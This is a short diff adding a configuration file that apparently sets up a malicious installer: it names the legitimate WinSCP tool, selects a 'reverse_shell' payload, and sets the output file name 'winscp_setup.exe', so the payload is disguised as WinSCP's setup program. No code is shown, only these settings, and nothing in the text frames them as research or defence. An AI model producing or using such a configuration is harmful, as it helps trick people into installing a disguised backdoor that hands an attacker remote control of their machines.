@@ -1,0 +1,4 @@
+reqs=2
+name=WinSCP
+payload=reverse_shell
+PAYLOAD_NAME=winscp_setup.exe
